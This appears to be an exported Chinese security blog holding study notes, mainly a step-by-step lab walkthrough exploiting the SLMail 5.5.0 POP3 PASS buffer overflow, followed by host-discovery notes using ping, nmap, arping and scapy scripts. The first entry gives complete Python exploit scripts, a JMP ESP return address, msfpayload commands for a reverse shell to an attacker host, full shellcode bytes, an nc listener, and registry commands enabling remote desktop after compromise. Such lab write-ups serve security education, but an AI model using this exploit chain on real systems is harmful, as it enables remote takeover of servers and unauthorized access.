    <content type="text"><![CDATA[缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。 程序的漏洞从哪里来： 罪恶的根源：变量 数据与代码边界不清（程序没有严格的限定） 由于控制不严会造成程序被严重的破坏 最简单漏洞原理——shell脚本 通过一个最简单的shell脚本来体现漏洞的由来： 这个脚本本意是将用户输入的字符显示出来，从程序的目的来看没有问题 12#！/bin/bashecho $ 但是这个程序没有做数据和命令上的过滤，通过一些特殊字符的构造就可以执行命令（比如； &amp;&amp; ||） 上面的结果就是一个简单的漏洞产生的原理，假如说这是一个服务器，攻击者就可以使用nc开一个监听端口，然后将shell重定向，这样就会直接控制服务器 缓冲区溢出： 当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据。 成功修改内存数据、可以造成进程劫持、执行恶意代码、获得服务器权限等后果。 如何发现漏洞： 源码审计（首先你得能接触到源码） 逆向工程 模糊测试 向程序堆栈发送随机、半随机的数据，根据存在内存变化判断溢出 （完全随机的不好判断） 数据生成器：生成随机、半随机的数据 （工具） 测试工具：识别溢出漏洞 （工具，主要使用一些动态调试工具） Windows缓冲区溢出 FUZZER SLMail 5.5.0 Mail Server （一个Windows下的存在缓冲区溢出的服务端） ImmunityDebugger_1_85setup.exe （一个调试工具，比OD的自动化程度高一些） mona.py （辅助脚本） 环境：Windows XP（需要将SLMail 、调试工具部署好） 安装SLMail按照提示安装完查看端口、服务（smtp、pop3等）是否开放 安装调试工具，如果没有Python2.7环境它会自动安装 将mono.py放在ImmunityDebugger的Pycommands文件夹中 SLMail 5.5.0 Mail Server pop3 pass命令存在缓冲区溢出漏洞 无需身份验证实现远程代码执行 DEP：阻止代码从数据页被执行 （Windows的一种安全防护机制） ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化 （Windows的一种安全防护机制） pop3 最简单的 110端口```123456789101112131415161718192021222324252627282930- 了解未知协议 - wireshark - RFC - 通过一个简单的Python脚本进行110端口的连接： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) print data s.send('USER admin' + '\r\n') data = s.recv(1024) print data s.send('PASS admin\r\n') data = s.recv(1024) print data s.close() print "\nDone!" except: print "Could not connect to POP3!" 这里已知SLMail 5.5.0的pass存在缓冲区溢出漏洞，在实际测试用就需要一步步调试 测试pass命令接收到大量数据时是否合法 EIP寄存器存放下一条指令的地址 2.py （通过一个简单的Python脚本来验证SLMail 5.5.0的pass命令存在存在缓冲区漏洞） 123456789101112131415161718192021#!/usr/bin/pythonimport socket buffer = ["A"]counter = 100while len(buffer) &lt;= 50: buffer.append("A"*counter) counter = counter + 200 for string in buffer: print "Fuzzing PASS with %s bytes " % len(string) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect(('192.168.111.137',110)) s.recv(1024) s.send("USER test" + '\r\n') s.recv(1024) s.send('PASS ' + string + '\r\n') s.send('QUIT\r\n') s.close() #向目标的110端口发送大量的A 首先确保开启了pop3： 打开ImmunityDebugger并且开始调试pop3服务的这个进程，查看端口状态的时候可以看到PID是2696 准备就绪以后启动脚本发送数据： 当数据到2700bytes的时候会发现EIP EBP寄存器都是4141 assic码就是A，这个时候发送大量的A造成了PASS指定的溢出，证明溢出确实存在： 溢出存在，如果EIP指令可以修改，就可以通过一些构造，就可能执行一些系统命令；还有一种可能，通过修改EIP的地址，将指令指向一个内存地址空间，通过缓冲区溢出添加shellcode，然后控制服务器。 通过PASS缓冲区溢出漏洞的验证，发现在数据发送到2900bytes的时候溢出 通过第三个脚本精确的找到溢出的四个字节 123456789101112131415#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer = 'A' * 2700 #因为前面是从2700开始溢出的try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!" 123456789101112131415#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer = 'A' * 2600 #改为2800确定是否在 2800-2900之间try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!" 现在再看POP3的进程，仅管还是溢出了，但是EIP不是全A的状态了，就证明精确溢出的四个字节在2600-2700： 更加精确定位 二分法 唯一字符串法：如果可以生成唯一的字符串，就可以精确定位是那四个字节填充了EIP 通过一个脚本生成 /usr/share/metasploit-framework/tools/exploit/```12345678910111213141516171819202122232425262728293031 ```udo ./pattern_create.rb -l 2700``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/17607469.jpg)- 将生成的2700字符串替换上个脚本中的2700个A，然后重新测试，得到如下结果： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65730627.jpg)- EIP中的四个字节的HEX为：39 69 44 38 由于计算机中内存的分配和人的阅读习惯刚好相反 ：38 44 69 39；对应的ASSIC为：8Di9- 使用脚本查看着四个字节的偏移量： ```sudo ./pattern_offset.rb -q 39694438``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/50197101.jpg)- 然后修改前面的脚本，将偏移量2606的字符串设置为A，然后溢出的四个字节设置为B，其余的设置为C，这样确定精确查找是否正确： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) buffer = &apos;A&apos; * 2606 + &apos;B&apos; * 4 + &apos;C&apos; * 80 try: print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.111.137&apos;,110)) data = s.recv(1024) s.send(&apos;USER test&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!&quot; except: print &quot;Could not connect to POP3!&quot; 通过查看EIP的数据：42424242 刚好是4个B，证明前面测试出的偏移量2606是正确的。这里就可以确定我们可以利用这里的精确修改EIP中的指定达到利用PASS缓冲区溢出的漏洞。 现在已经可以精确修改寄存器中的内容，被修改的寄存器有EIP（重点关注）、EBP、ESP；接下来的思路：将EIP修改为shellcode代码的内存地址，将shellcode写入该地址空间（ESP），程序读取EIP寄存器中的数值，然后跳转到shellcode代码段并执行 寻找可存放shellcode的内存空间 通过脚本来探测ESP寄存器的大小： 123456789101112131415#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer = 'A' * 2606 + 'B' * 4 + 'C' * 890try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!"![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/9248235.jpg) 然后查看esp中C的结束地址：（通过计算可以得出esp的空间大小为四百多，可以放下一个shellcode） 由于不同类型的程序、协议、漏洞、会认为一些字符是坏字符，这些字符有固定用途 返回地址、shellcode、buffer都不能出现坏字符 null byte (0x00) 空字符、用于终止字符串的拷贝操作 return （0x0D）回车操作，表示POP3 PASS命令输入完成 思路：发送0x00——0xff 256个字符，查找所有坏字符 123456789101112131415161718192021222324252627282930313233#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00""\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10""\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20""\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30""\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40""\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50""\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60""\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70""\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80""\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90""\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0""\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0""\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0""\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0""\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0""\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0")buffer = 'A' * 2606 + 'B' * 4 + badcharstry: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!" 这里我们可以发现ESP寄存器中没有内容了，然后follow in dump 查看具体位置，发现数据一直到0A的时候就异常了，然后修改脚本，删去0A，通过这种方法找到三个坏字符：0A 0D 00 理论上这个时候就可以进行数据的重定项了，将EIP的内容改为ESP的地址，但实际上是ESP的地址是变化的，所以这样就没有办法做重定向，硬编码不可行，这里就需要变通思路： 在内存中寻找地址固定的系统模块 在模块中寻找JMP ESP（内存地址固定不变）指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode mono.py脚本识别内存模块，搜索return address 是JMP ESP指令的模块 寻找无DEP、ALSR保护的内存地址 内存地址不含坏字符 配置好调试工具，启动mono脚本：modules```12345678910111213141516 ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/86872565.jpg) 我们可以发现系统正在运行的模块都出现了，那么如何找到合适的模块呢，先介绍一下上面的参数 rebase（操作系统重启以后是否发生变化，如变化，则为true，否则为false）这里寻找false的 safeseh aslr nxcompat 是操作系统的安全机制，都选false,true的是带有保护机制的，内存地址都是随机的。 OS dll表示每个操作系统都有的这里都选为TRUE- 由于计算机内存中存储的是二进制，汇编指令肯定是无法查找的，所以通过工具将汇编指令转换成二进制： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/17531204.jpg)- 然后我们进行jmp esp的查找，由于调试工具数据是十六进制，所以需要以十六进制的形式进行查找：```! mona find -s &quot;\xff\xe4&quot; -m slmfc.dll 很遗憾，这个模块里面没有，换其他模块，然后就可以找到可利用的：-s "\xff\xe4" -m slmfc.dll```1234567891011121314151617181920212223242526272829303132333435 ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/37554586.jpg)- 然后我们双击第一个模块，然后以汇编指令显示就会发现FFES: jmp esp ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/52427619.jpg)- 在jmp esp指令这里设置断点：（主要是为了利用脚本向跳转的这里发送溢出的代码，验证是否正常可以跳转） ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/8694262.jpg)- 然后我们修改前面精确溢出的代码，溢出的四个字节改为这里设置断点的内存地址，也就是jmp esp ，在添加390个C，也就是说：当程序执行到这jmp esp的时候，跳到ESP寄存器，然后将390个C存入ESP中 - 首先我们可以看到jmp esp的地址为：5F 4A 35 8F ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/38278009.jpg) - 然后我们在脚本里构造溢出的内容为这个地址，由于计算机读取数据和人读是相反的，所以要将地址反过来构造： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;C&apos; * 390 try: print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.111.137&apos;,110)) data = s.recv(1024) s.send(&apos;USER test&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!&quot; except: print &quot;Could not connect to POP3!&quot; 然后发送数据，查看EIP和ESP的内容：（发现确实跳转了，EIP的内容为跳转的地址，存储C也是在ESP中执行了，说明我们可以执行shellcode） 按F7执行下一步，发现又跳转到EIP： 现在解决了ESP的地址跳转问题，我们就可以进一步构造shellcode执行，进行系统的控制： 生成shellcode scratch （可以用这个去自己写） 用msfpayload生成shellcode -l``` 查看所有的payload1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 C``` 用反向连接的这个载荷，C表示的是C语言格式，但是生成以后我们发现存在坏字符，所以shellcode不能使用 - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;``` 这里使用msfemcode对三个字符进行转义，R是保证msfemcode可以使用、 ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/15011544.jpg)- 将shellcode加入代码中： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) shellcode = ( &quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7\x71\x2c&quot; + &quot;\xc1\x83\xeb\xfc\xe2\xf4\x0b\x1b\xc7\x8c\x1f\x88\xd3\x3e\x08\x11&quot; + &quot;\xa7\xad\xd3\x55\xa7\x84\xcb\xfa\x50\xc4\x8f\x70\xc3\x4a\xb8\x69&quot; + &quot;\xa7\x9e\xd7\x70\xc7\x88\x7c\x45\xa7\xc0\x19\x40\xec\x58\x5b\xf5&quot; + &quot;\xec\xb5\xf0\xb0\xe6\xcc\xf6\xb3\xc7\x35\xcc\x25\x08\xe9\x82\x94&quot; + &quot;\xa7\x9e\xd3\x70\xc7\xa7\x7c\x7d\x67\x4a\xa8\x6d\x2d\x2a\xf4\x5d&quot; + &quot;\xa7\x48\x9b\x55\x30\xa0\x34\x40\xf7\xa5\x7c\x32\x1c\x4a\xb7\x7d&quot; + &quot;\xa7\xb1\xeb\xdc\xa7\x81\xff\x2f\x44\x4f\xb9\x7f\xc0\x91\x08\xa7&quot; + &quot;\x4a\x92\x91\x19\x1f\xf3\x9f\x06\x5f\xf3\xa8\x25\xd3\x11\x9f\xba&quot; + &quot;\xc1\x3d\xcc\x21\xd3\x17\xa8\xf8\xc9\xa7\x76\x9c\x24\xc3\xa2\x1b&quot; + &quot;\x2e\x3e\x27\x19\xf5\xc8\x02\xdc\x7b\x3e\x21\x22\x7f\x92\xa4\x32&quot; + &quot;\x7f\x82\xa4\x8e\xfc\xa9\x37\xd9\x43\x4d\x91\x19\x3d\x9d\x91\x22&quot; + &quot;\xa5\x20\x62\x19\xc0\x38\x5d\x11\x7b\x3e\x21\x1b\x3c\x90\xa2\x8e&quot; + &quot;\xfc\xa7\x9d\x15\x4a\xa9\x94\x1c\x46\x91\xae\x58\xe0\x48\x10\x1b&quot; + &quot;\x68\x48\x15\x40\xec\x32\x5d\xe4\xa5\x3c\x09\x33\x01\x3f\xb5\x5d&quot; + &quot;\xa1\xbb\xcf\xda\x87\x6a\x9f\x03\xd2\x72\xe1\x8e\x59\xe9\x08\xa7&quot; + &quot;\x77\x96\xa5\x20\x7d\x90\x9d\x70\x7d\x90\xa2\x20\xd3\x11\x9f\xdc&quot; + &quot;\xf5\xc4\x39\x22\xd3\x17\x9d\x8e\xd3\xf6\x08\xa1\x44\x26\x8e\xb7&quot; + &quot;\x55\x3e\x82\x75\xd3\x17\x08\x06\xd0\x3e\x27\x19\xdc\x4b\xf3\x2e&quot; + &quot;\x7f\x3e\x21\x8e\xfc\xc1&quot;) buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;\x90&apos; * 8 +shellcode try: #\x90表示的是汇编中的nop，就是不执行操作，保证shellcode的可用性，为了防止esp执行的时候把我的shellcode的前面几个字符忽略掉 print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.111.137&apos;,110)) data = s.recv(1024) s.send(&apos;USER test&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!&quot; except: print &quot;Could not connect to POP3!&quot; 现在我们监听本地的4444端口，等待反向连接 nc -vlp 4444```1234567891011121314151617181920212223- 然后保证SLmail服务正常运行，发送数据，然后缓冲区溢出利用成功，拿到系统权限： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/34848509.jpg) - 执行系统命令： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21092299.jpg) - 觉得命令行不舒服：改注册表，然后3389远程连接： - ```tex echo Windows Registry Editor Version 5.00&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg C:\&gt;echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg regedit /s 3389.reg rdesktop 192.168.111.137 远程桌面连接。]]></content>
      <categories>
        <category>fuzzy</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>fuzzy</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主动信息收集——三层发现]]></title>
    <url>%2F2018%2F06%2F05%2F%E5%9F%BA%E4%BA%8ETCP-IP%E7%9A%84%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0.md%2F</url>
    <content type="text"><![CDATA[三层发现的优点 可路由 速度快 缺点 速度比二层慢 经常被边界防火墙过滤(还有可能出现宕机状态） IP、ICMP、TCP协议 ping 使用ping命令的时候如果可以接发包，使用的是数据包的type8，如果不可以使用的是type0 ping -192.168.0.102 -c 5 在这里linux和Windows的ping包有些不同，使用-c 可以指定发送多少个数据包 进行三层的发现除了进行icmp的探测之外还可以用路由追踪 使用路由追踪命令可能会被边界路由拦截，但是路由追踪和ping有点不同，它先会将TTL值设置为1，在经过第一跳路由以后减一，这个时候就会发送数据包12345678910111213141516171819- 使用traceroute和ping -R命令有点不同，使用traceroute返回的是较近的网卡，而使用ping -R返回的是较远的网卡- ```ping 192.168.1.103 -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1``` 这样使用管道就可以将存在的ip显示出来- 由于ping命令本身不支持一个网段的并发性扫描，所以通过脚本来实现，三层的发现简单bash脚本： ```bash #/bin/bash if [ &quot;$#&quot; -ne 1 ]; then echo &quot;Usage - ./ping.sh [interface]&quot; echo &quot;Example - ./ping.sh 192.168.1.0&quot; echo &quot;Example will perform an ICMP&quot; exit fi prefix=$(echo $1 | cut -d &apos;.&apos; -f 1-3) for addr in $(seq 1 254); do ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &gt;&gt; addr.txt done 除了使用bash调用ping命令之外，还可以使用scopy类似于二层发现时的脚本来进行主机发现，使用scopy的时候一定要设置超时，脚本如下： 12345678910111213141516171819import loggingimport subprocesslogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import * if len(sys.argv) != 2: print "Usage - ./pingr 0/24 ICMP" print "Example - ./pingr 192.168.0.103" print "Example will perform an ICMP scan of the 192.168.0.0/24 range" sys.exit()address = str(sys.argv[1])prefix = address.split('.')[0] + '.' + address.split('.')[1] + '.' + address.split('.')[2] + '.' for addr in range(1,254): answer=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=0.1,verbose=0) if answer == None: pass else: print prefix+str(addr) 使用脚本也可以调用已经存在的IP列表进行扫描，这样将脚本改为加载ip文件，然后调用扫描就可以了 除了使用ping和traceroute之外还可以使用nmap进行三层的发现： 192.168.1.103 -sn``` nmap 使用-sn的时候如果是在本网段的网络会发送arp包，如果不是在本网段会发送icmp的数据包，但由于nmap使用了大量不同的技术手段去探测目标，所以还会发送tcp的数据包。12343. fping :比ping的命令强大一点 - ```fping 192.168.1.103 -c 10 -g 192.168.1.1 192.168.1.103 -c 10``` fping 与ping命令不同的是将一个ip段进行扫描，也可以使用0/24扫描，只显示ip的话可以使用管道进行分割12345678910111213 - ```fping -f iplist.txt``` 调用ip列表文件4. hping : - 能发送几乎任意TCO/IP的数据包，在一定程度上可以进行压力测试 - 功能强大，但每次只能扫描一个目标 - ```hping3 192.168.1.103 --icmp -c 2``` 也可以进行三层扫描 - 也可以使用一行的方式实现一个ip段的扫描，因为显示的内容太多，所以将扫描结果保存到一个TXT文件中 ```for addr in $(seq 1 254);do hping3 192.168.1.$addr --icmp -c 1 &gt;&gt; hping.txt &amp; done]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主动信息收集]]></title>
    <url>%2F2018%2F06%2F05%2F%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[被动收集的信息可能不是最新的信息，通过主动的手段去发现更精确的信息 直接与目标系统交互通信 无法避免留下访问的痕迹（如果目标系统有完善的系统日志） 使用受控的第三方电脑进行探测 使用代理或已经被控制的主机 做好本封杀的准备 使用噪声迷惑目标，淹没真实的探测流量 扫描 发送不同的探测，根据返回结果判断目标状态（ip，端口，服务） 发现 识别活着的主机 潜在的被攻击目标 输出一个ip地址列表 2，3，4层发现 发现——二层发现 优点：扫描速度快，可靠 缺点：不可路由，只能发现本网段 ARP协议 抓包 arping:(二层中单个存活主机的探测) arping 192.168.0.1 -c 1``` -c是指定发送一个包以后看是否存在，否则会一直发包；如果不在一个网络里，发包的话是不存在的12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 - ```sudo arping 192.168.0.1 -d``` -d是同一个ip拥有不同的Mac地址，就是说，如果结果显示有两个Mac地址声称自己是网关，那么你的网络就存在arp欺骗，然后根据路由器查arp表进行定位 - ```sudo arping 192.168.0.1 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 |cut -d &quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1``` 通过管道显示活着的主机 - 但是这样只能扫描一个ip，不能自动化的去扫描一个网段，所以用脚本去实现：扫描的时候可以指定网卡，这里用bash脚本来实现这个功能```sudo ./arping1.sh eth0 &gt; addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/12275742.jpg) - 第二个脚本：这个脚本的功能是去探测已知ip列表的主机是否存活的脚本，前提是要有一个ip列表的文件```sudo ./arping2.sh addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/77751631.jpg) - 如果要在扫描的时候直接将结果重定向到一个文本文件中，直接早bash脚本中添加即可2. 二层发现——nmap: - ```nmap -sn 192.168.0.1/24``` 扫描速度更快，显示的信息更多 - &gt; Nmap scan report for 192.168.0.1 &gt; Host is up (0.020s latency). &gt; Nmap scan report for 192.168.0.101 &gt; Host is up (0.0011s latency). &gt; Nmap scan report for 192.168.0.104 &gt; Host is up (0.084s latency). &gt; Nmap scan report for 192.168.0.107 &gt; Host is up (0.00059s latency). &gt; Nmap done: 256 IP addresses (4 hosts up) scanned in 5.65 seconds - ```nmap -iL filename -sn``` 这个可以做和arping第二个脚本一样的工作 &gt; -sn 参数不做端口扫描，但它不仅仅发ARP记录，还会DNS做ptr反向域名解析的解析3. 二层发现———Netdiscover - 专用与二层发现 - 可用于无线和交换网络环境 - 主动和被动扫描 - 主动 - netdiscover -i eth0 -r 192.168.0.1/24![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/71668956.jpg) - netdiscover -l iplist.txt - 被动 - netdiscover -p （开启混杂模式）只要在在网卡上有arp包数据，就可以侦听到：![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/18073354.jpg) - 主动arp容易触发预警4. 二层发现———Scapy - scapy - 作为Python的库文件进行调用 - 也可以做单独的工具使用 - 抓包，分析，创建，修改，注入网络流量 - apt-get install python-gnuplot - 输入scapy启动scapy启动，然后输入ARP()调用这个函数，```ARP().display()查询ARP函数的属性``` ，这样就可以定制（arp的报头结构，将函数的属性字段添加进去，这样就可以实现一个arp查询）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/83165222.jpg) - 直接利用scapy进行arp探测，实际上就是通过调用scapy自带的函数进行查询： - 首先```sudo scapy``` 启动进行scapy命令行模式下 - 通过```ARP().display()``` 可以查看APR这个函数下的函数头，然后这只pdst这个要查询的目标```arp.pdst=&quot;192.168.0.1&quot;``` 这里的arp是设置的变量 - 通过```sr1(arp)``` 进行发包然后查看回显：这里也可以设置一个anwser变量带代替返回的数据包，然后调用display方法查看数据包的返回情况（有一个问题，如果查询的是一个不存在的ip，这样会一直发包，所以要加上timeout，加上一个verbose=1，显示详细的信息）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/81052649.jpg) - scapy是Python的库，所以也支持Python脚本来进行探测，可以调用这个库来写脚本进行arp扫描，前面用的是shell脚本```sudo ./arp_disc.py eth0``` 用脚本的话要慢，首先这里设计的脚本不是多线程，其次还要判断超时的时间，当然为了准确性，scarp默认发两个数据包 &gt; ```python &gt; #!/usr/bin/python &gt; &gt; import logging &gt; import subprocess &gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR) &gt; from scapy.all import * &gt; &gt; if len(sys.argv) != 2: &gt; print &quot;Usage - ./arp_disc.py [interface]&quot; &gt; print &quot;Example - ./ar_disc.py eth0&quot; &gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot; &gt; sys.exit() &gt; &gt; interface = str(sys.argv[1]) &gt; &gt; ip = subprocess.check_output(&quot;ifconfig&quot; + interface + &quot; | grep &apos;inet&apos; | cut -d&apos;.&apos; -f 1-3 | cut -d&quot; &quot; -f 10 | cut -d &apos;f&apos; -f 1 &quot;,shell = True).strip() &gt; &gt; prefix = ip.split(&apos;.&apos;)[0] + &apos;.&apos; + ip.split(&apos;.&apos;)[1] + &apos;.&apos; +ip.split(&apos;.&apos;)[2] + &apos;.&apos; &gt; &gt; for addr in range(1,254): &gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 1,verbose = 0) &gt; if answer == None: &gt; pass &gt; else: &gt; print prefix + str(addr) &gt; 第二个脚本，这个脚本和arping的第二个脚本类似，都是可以调用已知的ip列表文件进行二层的发现：./arp_disc.py ip_list.txt``` 脚本代码如下：1234567891011121314151617181920212223242526&gt; ```python&gt; #!/usr/bin/python&gt; #-*- coding:utf-8 -*-&gt; &gt; import logging&gt; import subprocess&gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)&gt; from scapy.all import *&gt; &gt; if len(sys.argv) != 2:&gt; print &quot;Usage - ./arp_disc.py [filename]&quot;&gt; print &quot;Example - ./arp_disc.py ip_list.txt&quot;&gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;&gt; sys.exit()&gt; &gt; filename = str(sys.argv[1])&gt; file = open(filename,&apos;r&apos;) #打开文件列表&gt; &gt; for addr in file:&gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 0.1,verbose = 0) #verbose=0，不显示报错的具体信息&gt; if answer == None:&gt; pass&gt; else:&gt; print addr.strip() #将报错信息打印出来&gt; 总结：二层的发现主要是在拿下一台主机以后以此机器作为跳板进而对整个内网进行发现，但是由于内网的网络环境未知，而且服务器上面不一定有nmap，所以我们要利用一切可以利用的工具：arping，nmap,netdiscover,scopy等工具，以及自己编写的脚本 针对上面的两个脚本再补充两个多线程的脚本，就当做py练手了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&gt; #!/usr/bin/python&gt; # -*- coding:utf-8 -*-&gt; import logging&gt; import subprocess&gt; import threading,time&gt;&gt; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)&gt; from scapy.all import *&gt;&gt; if len(sys.argv) != 2:&gt; print "Usage - ./arp_disc.py [interface]"&gt; print "Example - ./arp_disc.py eth0"&gt; print "Example will perform an ARP scan of the local subnet to which eth0 is assigned"&gt; 